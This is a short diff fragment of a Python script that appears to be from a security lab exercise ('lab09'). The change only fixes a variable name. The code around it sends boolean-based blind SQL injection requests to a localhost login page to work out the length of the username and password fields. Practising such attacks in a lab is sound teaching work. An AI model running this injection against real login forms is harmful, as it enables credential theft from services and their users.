@@ -19,7 +19,7 @@ listASCII=string.printable
 iterator=cycle(['username','password'])
 
 for x in xrange(0,100):
-	field=myIterator.next()
+	field=iterator.next()
 	size = 0;
 	for s in xrange(0,40):
 		request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(" +field+ ")%20=%20" + str(s) + "--%20"
